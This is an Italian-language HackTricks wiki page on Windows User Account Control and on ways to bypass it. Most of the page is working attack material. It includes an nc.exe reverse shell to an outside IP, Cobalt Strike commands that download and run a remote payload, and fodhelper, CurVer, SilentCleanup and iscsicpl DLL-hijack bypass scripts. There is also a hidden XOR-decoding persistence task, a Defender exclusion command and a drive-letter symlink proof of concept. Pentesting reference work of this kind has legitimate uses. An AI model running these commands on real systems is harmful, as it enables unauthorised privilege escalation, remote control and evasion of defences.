# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) è una funzionalità che abilita una **richiesta di consenso per le attività con privilegi elevati**. Le applicazioni hanno diversi livelli di `integrity` e un programma con un **livello elevato** può eseguire attività che **potrebbero compromettere il sistema**. Quando UAC è abilitato, applicazioni e attività vengono sempre **eseguite nel contesto di sicurezza di un account non amministratore**, a meno che un amministratore non autorizzi esplicitamente tali applicazioni/attività ad avere accesso a livello amministratore al sistema per essere eseguite. È una funzionalità di praticità che protegge gli amministratori da modifiche involontarie, ma non è considerata un confine di sicurezza.<sup>[[2]](#references)</sup>

Per ulteriori informazioni sui livelli di integrità:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Quando UAC è attivo, a un utente amministratore vengono assegnati 2 token: un token utente standard, per eseguire azioni normali con integrità media, e uno con i privilegi amministrativi.

Questa [pagina](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) spiega in modo approfondito come funziona UAC e include il processo di accesso, l'esperienza utente e l'architettura di UAC.<sup>[[2]](#references)</sup> Gli amministratori possono utilizzare i criteri di sicurezza per configurare il funzionamento di UAC in base alla propria organizzazione a livello locale (utilizzando secpol.msc), oppure configurarli e distribuirli tramite Group Policy Objects (GPO) in un ambiente di dominio Active Directory. Le varie impostazioni sono descritte in dettaglio [qui](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Per UAC è possibile impostare 10 criteri di Group Policy. La tabella seguente fornisce ulteriori dettagli:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabilitato)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Richiedi il consenso per i file binari non Windows sul desktop protetto) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Richiedi le credenziali sul desktop protetto)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Abilitato; disabilitato per impostazione predefinita in Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabilitato)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Abilitato)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Abilitato)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabilitato)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Abilitato)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Abilitato)                                              |

### Criteri per l'installazione del software su Windows

I **criteri di sicurezza locali** ("secpol.msc" nella maggior parte dei sistemi) sono configurati per impostazione predefinita in modo da **impedire agli utenti non amministratori di eseguire installazioni software**. Ciò significa che, anche se un utente non amministratore può scaricare il programma di installazione del software, non potrà eseguirlo senza un account amministratore.

### Chiavi di registro per forzare UAC a richiedere l'elevazione

In qualità di utente standard senza diritti di amministratore, è possibile fare in modo che l'account "standard" riceva una **richiesta di credenziali da parte di UAC** quando tenta di eseguire determinate azioni. Questa azione richiederebbe la modifica di alcune **chiavi di registro**, per le quali sono necessarie autorizzazioni di amministratore, a meno che non sia presente un **UAC bypass** o l'attacker non abbia già effettuato l'accesso come amministratore.

Anche se l'utente appartiene al gruppo **Administrators**, queste modifiche obbligano l'utente a **inserire nuovamente le credenziali del proprio account** per eseguire azioni amministrative.

**In pratica, questo è utile solo quando si dispone già di un token elevato, di un UAC bypass o di una misconfiguration che consente di modificare queste chiavi; altrimenti la scrittura nel registro viene bloccata.**

Le chiavi e le voci di registro da modificare sono le seguenti (con i relativi valori predefiniti tra parentesi):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

È possibile eseguire questa operazione anche manualmente tramite lo strumento Local Security Policy. Dopo la modifica, per le operazioni amministrative viene richiesto all'utente di inserire nuovamente le proprie credenziali.

### Nota

**User Account Control non è un confine di sicurezza.** Pertanto, gli utenti standard non possono evadere dai propri account e ottenere diritti di amministratore senza un exploit di local privilege escalation.

### Richiedere a un utente il "pieno accesso al computer"
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### Privilegi UAC

- La modalità protetta di Internet Explorer utilizza controlli di integrità per impedire ai processi con livello di integrità elevato (come i web browser) di accedere a dati con livello di integrità basso (come la cartella dei file Internet temporanei). Questo viene ottenuto eseguendo il browser con un token a bassa integrità. Quando il browser tenta di accedere ai dati memorizzati nella zona a bassa integrità, il sistema operativo controlla il livello di integrità del processo e consente l'accesso di conseguenza. Questa funzionalità aiuta a impedire che gli attacchi di remote code execution accedano a dati sensibili sul sistema.
- Quando un utente accede a Windows, il sistema crea un access token che contiene un elenco dei privilegi dell'utente. I privilegi sono definiti come la combinazione dei diritti e delle capacità di un utente. Il token contiene anche un elenco delle credenziali dell'utente, ovvero le credenziali utilizzate per autenticare l'utente al computer e alle risorse sulla rete.

### Autoadminlogon

Per configurare Windows affinché effettui automaticamente l'accesso con un utente specifico all'avvio, imposta la **`AutoAdminLogon` registry key**. Questo è utile negli ambienti kiosk o per scopi di testing. Utilizzalo solo su sistemi sicuri, poiché espone la password nel registry.

Imposta le seguenti chiavi utilizzando il Registry Editor o `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Per ripristinare il normale comportamento di accesso, imposta `AutoAdminLogon` su 0.

## UAC bypass

> [!TIP]
> Nota che, se hai accesso grafico alla vittima, l'UAC bypass è immediato, poiché puoi semplicemente fare clic su "Yes" quando compare il prompt UAC

L'UAC bypass è necessario nella seguente situazione: **l'UAC è attivato, il tuo processo è in esecuzione in un contesto di integrità media e il tuo utente appartiene al gruppo administrators**.

È importante menzionare che è **molto più difficile eseguire l'UAC bypass se il livello di sicurezza è impostato sul valore più alto (Always) rispetto a uno qualsiasi degli altri livelli (Default).**

### Fast triage da una shell a integrità media

Prima di tentare un bypass, conferma di trovarti nello scenario corretto e associa la build dell'host ai metodi noti funzionanti:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Note pratiche:
- Se `EnableLUA=0`, non è necessario un bypass: qualsiasi token di amministratore può richiedere direttamente un livello di integrità elevato.
- `ConsentPromptBehaviorAdmin=2` o `5` è lo scenario comune per i bypass auto-elevate / basati su COM.
- `Always Notify` innalza il livello di difficoltà, ma dovresti comunque testare la build esatta invece di presumere un fallimento: UACME tiene ancora traccia di alcuni metodi `AlwaysNotify compatible` sulle build moderne di Windows.<sup>[[3]](#references)</sup>

### UAC disabilitato

Se UAC è già disabilitato (`ConsentPromptBehaviorAdmin` è **`0`**), puoi **eseguire una reverse shell con privilegi di amministratore** (livello di integrità elevato) utilizzando qualcosa come:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass con duplicazione del token

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Molto** Basic UAC "bypass" (accesso completo al file system)

Se hai una shell con un utente che appartiene al gruppo Administrators, puoi **montare la condivisione C$** tramite SMB (file system) localmente su un nuovo disco e avrai **accesso a tutto ciò che si trova all'interno del file system** (anche alla cartella home di Administrator).

> [!WARNING]
> **Sembra che questo trucco non funzioni più**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass con Cobalt Strike

Le tecniche di Cobalt Strike funzioneranno solo se UAC non è impostato al livello di sicurezza massimo
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** e **Metasploit** dispongono inoltre di diversi moduli per **bypassare** l'**UAC**.

### Interfacce COM con elevazione (`ICMLuaUtil` / `CMSTPLUA`)

Gli oggetti COM con elevazione automatica rimangono una superficie UAC pratica sulle build moderne. `ICMLuaUtil` è ancora indicato da UACME come funzionante sui rami attuali di Windows, e gli strumenti offensivi continuano ad adattare `CMSTPLUA` combinando un processo desktop interattivo, l'esecuzione a 64 bit e talvolta il masquerading del PEB/processo prima di invocare il COM Elevation Moniker.<sup>[[3]](#references)</sup>

Suggerimenti pratici:
- Preferire un processo a **64 bit** nella **sessione interattiva** dell'utente (comunemente `explorer.exe` o un suo processo figlio).
- Se una shell raw fallisce, riprovare da un'implementazione BOF / UACME invece di un wrapper `CreateProcess` ingenuo.
- Prevedere che l'esecuzione del processo figlio avvenga in un **processo elevato separato**; molti BOF non elevano il beacon corrente in-place.

### KRBUACBypass

Documentazione e tool disponibili su [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Exploit di bypass dell'UAC

[**UACME** ](https://github.com/hfiref0x/UACME), che è una **raccolta** di diversi exploit di bypass dell'UAC. Nota che dovrai **compilare UACME usando Visual Studio o msbuild**. La compilazione creerà diversi eseguibili (come `Source\Akagi\outout\x64\Debug\Akagi.exe`); dovrai sapere **quale ti serve.**<sup>[[3]](#references)</sup>\
Dovresti **fare attenzione**, perché alcuni bypass **mostreranno prompt per altri programmi** che **avviseranno** l'**utente** che sta accadendo qualcosa.<sup>[[3]](#references)</sup>

UACME indica la **build a partire dalla quale ogni tecnica ha iniziato a funzionare**.<sup>[[3]](#references)</sup> Puoi cercare una tecnica che influisca sulle tue versioni:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Inoltre, utilizzando [questa](https://en.wikipedia.org/wiki/Windows_10_version_history) pagina puoi ricavare la release di Windows `1607` dalle versioni della build.

Un workflow pratico consiste nel **valutare prima la build dell'host** e solo successivamente eseguire il metodo corrispondente:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` confronta rapidamente la build locale con i metodi UAC noti, utile per scartare velocemente i PoC non più validi.<sup>[[4]](#references)</sup>
- `UACME` rimane il miglior catalogo pubblico per associare un bypass a una build precisa. Le release recenti hanno aggiunto nuovi metodi e rieseguito i test su quelli esistenti con **Windows 11 25H2**, quindi controlla nuovamente il README e le note di rilascio prima di presumere che un vecchio post di un blog sia ancora applicabile senza modifiche.<sup>[[3]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Il binario attendibile `fodhelper.exe` viene elevato automaticamente nelle versioni moderne di Windows. Al suo avvio, interroga il percorso del registro per-utente riportato di seguito senza convalidare il verbo `DelegateExecute`. Inserire un comando in quel punto consente a un processo con Medium Integrity (l'utente appartiene al gruppo Administrators) di avviare un processo con High Integrity senza un prompt UAC.

Percorso del registro interrogato da fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>Passaggi PowerShell (imposta il tuo payload, quindi attivalo)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Note:
- Funziona quando l'utente corrente è membro del gruppo Administrators e il livello UAC è predefinito/lenient (non Always Notify con restrizioni aggiuntive).
- Usa il percorso `sysnative` per avviare una PowerShell a 64 bit da un processo a 32 bit su Windows a 64 bit.
- Il payload può essere qualsiasi comando (PowerShell, cmd o un percorso EXE). Evita le UI che richiedono interazione per mantenere la stealth.

#### Variante CurVer/extension hijack (solo HKCU)

I campioni recenti che abusano di `fodhelper.exe` evitano `DelegateExecute` e invece **reindirizzano il ProgID `ms-settings`** tramite il valore `CurVer` per-utente. Il binario auto-elevated risolve comunque l'handler sotto `HKCU`, quindi non è necessario un token amministrativo per installare le chiavi:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Una volta ottenuti privilegi elevati, il malware comunemente **disabilita le richieste future** impostando `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` su `0`, quindi esegue ulteriore defense evasion (ad es., `Add-MpPreference -ExclusionPath C:\ProgramData`) e ricrea la persistenza per essere eseguito con elevata integrità. Una tipica attività di persistenza memorizza su disco uno **script PowerShell crittografato con XOR** e lo decodifica/esegue in memoria ogni ora:<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Questa variante elimina comunque il dropper e lascia solo i payload staged, rendendo il rilevamento dipendente dal monitoraggio dell’**hijack di `CurVer`**, della manomissione di `ConsentPromptBehaviorAdmin`, della creazione di esclusioni di Defender o delle attività pianificate che decrittano PowerShell in memoria.<sup>[[5]](#references)</sup>

### UAC bypass tramite attività `SilentCleanup` (`HKCU\Environment\windir`)

`SilentCleanup` avvia `cleanmgr.exe` con i privilegi massimi ed espande `%windir%` dall’ambiente dell’utente. Se controlli `HKCU\Environment\windir`, puoi reindirizzare tale espansione verso un comando arbitrario e ottenere un’integrità elevata senza una finestra di consenso.<sup>[[8]](#references)</sup> Questo metodo merita ancora di essere testato sulle build recenti, perché UACME mantiene attiva la tecnica e il monitoraggio dei problemi recenti indica che Windows 11 24H2 potrebbe richiedere solo piccoli aggiustamenti alle virgolette.<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
Se il task cita il percorso su quella build, riprova con il payload che termina con una virgoletta (ad esempio `cmd.exe"`). Esegui sempre la pulizia di `HKCU\Environment\windir` dopo i test.

#### Altri UAC bypass

Molti UAC bypass classici che abusano dei flussi dell'interfaccia, degli oggetti COM o dell'interazione con il desktop richiedono una **sessione interattiva completa** con la vittima; una shell `nc.exe` comune o un servizio in esecuzione nella **Session 0** spesso non sono sufficienti.

Spesso puoi risolvere il problema usando una sessione **meterpreter**. Esegui la migrazione verso un **processo** che abbia il valore **Session** uguale a **1**:

![Punta ms-settings a un'estensione personalizzata (.thm) e associa tale estensione al nostro payload - Altri UAC bypass: puoi farlo usando una sessione meterpreter. Esegui la migrazione verso un processo che abbia Session...](<../../images/image (863).png>)

(_explorer.exe_ dovrebbe funzionare)

### UAC Bypass with GUI

Se hai accesso a una **GUI**, puoi semplicemente accettare il prompt UAC quando appare; non hai realmente bisogno di un bypass tecnico. Pertanto, ottenere una sessione GUI è spesso sufficiente per bypassare l'attrito pratico aggiunto da UAC.

Inoltre, se ottieni una sessione GUI che qualcuno stava utilizzando (potenzialmente tramite RDP), ci sono **alcuni strumenti che saranno in esecuzione come amministratore**, dai quali potresti **eseguire** direttamente, ad esempio, un **cmd** **come amministratore**, senza che UAC lo richieda nuovamente, come [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Questo potrebbe essere un po' più **stealthy**.

### Noisy brute-force UAC bypass

Se non ti interessa essere rumoroso, puoi sempre **eseguire qualcosa come** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin), che **richiede l'elevazione dei permessi finché l'utente non la accetta**.

### Il tuo bypass - Metodologia di base per UAC bypass

Se dai un'occhiata a **UACME**, noterai che **molti UAC bypass abusano del DLL hijacking** (spesso facendo caricare a un binario con privilegi elevati una DLL controllata dall'attacker da un percorso scrivibile). [Leggi questo per scoprire come trovare una vulnerabilità di DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Trova un binario che esegua **autoelevate** (verifica che, quando viene eseguito, funzioni con un livello di integrità elevato).
2. Usa Procmon per trovare eventi "**NAME NOT FOUND**" che potrebbero essere vulnerabili al **DLL Hijacking**.
3. Probabilmente dovrai **scrivere** la DLL all'interno di alcuni **percorsi protetti** (come C:\Windows\System32), dove non hai permessi di scrittura. Puoi bypassare questa limitazione usando:
1. **wusa.exe**: Windows 7, 8 e 8.1. Consente di estrarre il contenuto di un file CAB all'interno di percorsi protetti (perché questo strumento viene eseguito con un livello di integrità elevato).
2. **IFileOperation**: Windows 10.
4. Prepara uno **script** per copiare la tua DLL all'interno del percorso protetto ed eseguire il binario vulnerabile e autoelevated.

### Un'altra tecnica di UAC bypass

Consiste nel verificare se un **binario autoElevated** tenta di **leggere** dal **registro** il **nome/percorso** di un **binario** o di un **comando** da **eseguire** (questo è più interessante se il binario cerca queste informazioni all'interno di **HKCU**).

### UAC bypass tramite `SysWOW64\iscsicpl.exe` + DLL hijack del `PATH` dell'utente

Il binario a 32 bit `C:\Windows\SysWOW64\iscsicpl.exe` è un binario **auto-elevated** che può essere abusato per caricare `iscsiexe.dll` tramite l'ordine di ricerca. Se puoi posizionare una `iscsiexe.dll` malevola all'interno di una cartella **scrivibile dall'utente** e modificare quindi il `PATH` dell'utente corrente (ad esempio tramite `HKCU\Environment\Path`) in modo che tale cartella venga cercata, Windows potrebbe caricare la DLL dell'attacker all'interno del processo elevato `iscsicpl.exe` **senza mostrare un prompt UAC**.<sup>[[1]](#references)[[6]](#references)</sup>

Note pratiche:
- Questo è utile quando l'utente corrente appartiene agli **Administrators**, ma opera a **Medium Integrity** a causa di UAC.
- La copia in **SysWOW64** è quella rilevante per questo bypass. Considera la copia in **System32** come un binario separato e convalida il comportamento in modo indipendente.
- La primitiva è una combinazione di **auto-elevation** e **DLL search-order hijacking**, quindi lo stesso flusso di lavoro con ProcMon usato per altri UAC bypass è utile per convalidare il caricamento della DLL mancante.

Flusso minimo:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Idee per il rilevamento:
- Generare un alert su `reg add` / scritture nel registro verso `HKCU\Environment\Path` seguite immediatamente dall'esecuzione di `C:\Windows\SysWOW64\iscsicpl.exe`.
- Cercare `iscsiexe.dll` in posizioni **controllate dall'utente** come `%TEMP%` o `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Correlare gli avvii di `iscsicpl.exe` con processi figlio o caricamenti di DLL imprevisti provenienti dall'esterno delle normali directory di Windows.

### Ricerche più recenti da verificare separatamente

Alcune catene successive al 2024 non assomigliano più ai classici registry hijack di `HKCU\Software\Classes`. Ad esempio, l'avvelenamento della cache del contesto di attivazione può concatenare un **rimappamento dell'unità** e il **reindirizzamento di DLL** per passare da un'integrità media a una elevata tramite UI attendibili / binari auto-elevati come `ctfmon.exe` e target successivi come `fodhelper.exe`. Invece di duplicare qui il PoC completo, controllare gli esempi di payload compatti in:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Hijack della lettera dell'unità di Administrator Protection (25H2) tramite mappa dei dispositivi DOS per sessione di accesso

Per la superficie di attacco completa di `RAiLaunchAdminProcess` / UIAccess su Windows 11 25H2, consultare la pagina dedicata:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 “Administrator Protection” utilizza token shadow-admin con mappe `\Sessions\0\DosDevices/<LUID>` per sessione. La directory viene creata pigramente da `SeGetTokenDeviceMap` alla prima risoluzione di `\??`. Se l'attaccante impersona il token shadow-admin solo a **SecurityIdentification**, la directory viene creata con l'attaccante come **owner** (eredita `CREATOR OWNER`), consentendo link alle lettere delle unità che hanno la precedenza su `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Passaggi:**

1. Da una sessione con privilegi ridotti, chiamare `RAiProcessRunOnce` per avviare un `runonce.exe` shadow-admin senza prompt.
2. Duplicare il suo token primario in un token di **identificazione** e impersonarlo durante l'apertura di `\??` per forzare la creazione di `\Sessions\0\DosDevices/<LUID>` sotto il controllo dell'attaccante.
3. Creare un symlink `C:` che punti a uno storage controllato dall'attaccante; gli accessi successivi al filesystem in quella sessione risolveranno `C:` nel percorso dell'attaccante, consentendo un DLL/file hijack senza prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## Riferimenti

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Come funziona User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Raccolta di tecniche di UAC bypass](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Scanner di compatibilità e launcher per UAC bypass](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI adotta l'AI per generare backdoor PowerShell](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos: sfruttamento 0-Day contro obiettivi governativi del Sud-est asiatico](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Bypassing Windows Administrator Protection](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – Bypass UAC tramite il task SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)

{{#include ../../banners/hacktricks-training.md}}
